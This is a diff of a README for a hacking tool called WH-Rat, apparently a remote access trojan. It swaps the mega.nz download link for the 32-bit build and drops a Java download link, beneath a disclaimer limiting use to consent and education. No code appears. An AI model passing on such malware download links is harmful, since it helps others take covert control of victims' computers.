@@ -9,10 +9,9 @@
 Usage of WH-Cyberspace Hacking Tool for attacking targets without prior mutual  consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes. 
 
 # if your cpu is 32 bit then you are download it
-☆ java >  jre x86 [Here]( https://www.oracle.com/java/technologies/javase-jre8-downloads.html?fbclid=IwAR22d1RWiauPFfB1Ei2B-ryUT4tBJGpHQLbimDn07nre2rAkyjHoaORZ4x8 " JAVA JRE")
 
 
-☆ WH-Rat x86 v1.3 / 32 bit > mega drive :[Here]( https://mega.nz/file/RR1XjSTB#uYst1_xdeBmTlveHfmqoNygDU557Z1J_t5oFPjcFdJc "WH-Rat x86 v1.3  / 32 bit")
+☆ WH-Rat x86 v1.3 / 32 bit > mega drive :[Here]( https://mega.nz/file/MF1wQQKb#CG_4VvrBlp27JjSZMsD7-g7LOAuzGevGaHCYmK_MWpg "WH-Rat x86 v1.3  / 32 bit")
 
  or
 
